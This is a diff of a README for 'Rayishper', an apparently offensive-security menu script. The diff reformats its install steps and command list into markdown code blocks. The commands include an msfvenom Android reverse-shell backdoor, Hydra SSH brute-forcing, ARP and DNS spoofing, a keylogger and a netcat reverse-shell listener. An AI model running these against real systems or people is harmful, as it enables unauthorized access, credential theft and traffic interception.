@@ -30,32 +30,43 @@ Rayishper started as a simple note-taking practice to assist with various cybers
 Clone the Rayishper repository:
 
 ```bash
-git clone [https://github.com/your-repo/rayishper.git] (https://github.com/your-repo/rayishper.git)
+git clone https://github.com/your-repo/rayishper.git
+```
+```bash
 cd rayishper
+```
 
 ## Make the script executable:
+```bash
 chmod +x rayishper.py
+```
 
 ## Install the required dependencies:
+```bash
 sudo apt-get update
+```
+```bash
 sudo apt-get install python3 python3-pip metasploit-framework nmap hydra tcpdump aircrack-ng john setoolkit
-Ensure that all tools used in the script are correctly installed and accessible in your PATH.
+```
+**Ensure that all tools used in the script are correctly installed and accessible in your PATH.**
 
 ## Dependencies: 
 The Rayishper script relies on the following tools and libraries:
 
-Python 3: The core programming language used in the script.
-Metasploit-Framework: For payload generation, reverse shell listeners, and exploitation.
-nmap: For network scanning and discovery.
-Hydra: For brute-forcing SSH logins.
-Tcpdump: For packet sniffing and network analysis.
-Aircrack-ng: For wireless network cracking.
-John-the-Ripper: For password cracking.
-Social-Engineering-Toolkit-(SET): For social engineering attacks.
+- **Python-3:** The core programming language used in the script.
+- **Metasploit Framework:** For payload generation, reverse shell listeners, and exploitation.
+- **nmap:** For network scanning and discovery.
+- **Hydra:** For brute-forcing SSH logins.
+- **Tcpdump:** For packet sniffing and network analysis.
+- **Aircrack ng:** For wireless network cracking.
+- **John the Ripper:** For password cracking.
+- **Social Engineering Toolkit (SET):** For social engineering attacks.
 
 ## Usage
 ## To run Rayishper:
-[./rayishper.py](./rayishper.py)
+```bash 
+./rayishper.py 
+ ```
 
 ## Main Menu
 When you start the script, you'll be prompted with the following options:
@@ -67,35 +78,62 @@ Below is a summary of the main commands used within Rayishper:
 
 ## VF685 Hack
 Description: Automate hacking a specific VF685 target.
-Command: python3 VF685.py
+Command: 
+```bash 
+python3 VF685.py
+```
 
 ## Keylogger Deployment
 Description: Start a keylogger that logs keystrokes to a file.
-Command: python3 keylog.py
+Command:
+```bash 
+ python3 keylog.py
+```
 
 ## Payload Creation
 Description: Generate a custom Android payload using Metasploit.
-Command: msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {location}/{Backdoor_name}
+Command: 
+```bash 
+msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {location}/{Backdoor_name}
+```
 
 ## SSH Brute-Force
 Description: Perform a brute-force attack on SSH login.
-Command: hydra -l {username} -P {wordlist} ssh://{target_ip}
+Command: 
+```bash
+hydra -l {username} -P {wordlist} ssh://{target_ip}
+```
 
 ## Network Scanning
 Description: Scan a target IP for open ports and services.
-Command: nmap -sV {target_ip}
+Command: 
+```bash
+nmap -sV {target_ip}
+```
 
 ## ARP Spoofing
 Description: Perform ARP spoofing to intercept traffic.
-Command: sudo arpspoof -i eth0 -t {target_ip} -r {gateway_ip}
+Command: 
+```bash
+sudo arpspoof -i eth0 -t {target_ip} -r {gateway_ip}
+```
 
 ## Reverse Shell Listener
 Description: Start a netcat listener for reverse shells.
-Command: nc -lvnp {lport}
+Command: 
+```bash
+nc -lvnp {lport}
+```
 
 ## DNS Spoofing
 Description: Spoof DNS responses on a network.
-Command: sudo dnsspoof
+Command: 
+```bash
+sudo dnsspoof
+```
 
 ## License
-This project is open-source and available under the MIT License.
+This project is open-source and available under the 
+```bash 
+MIT License.
+```
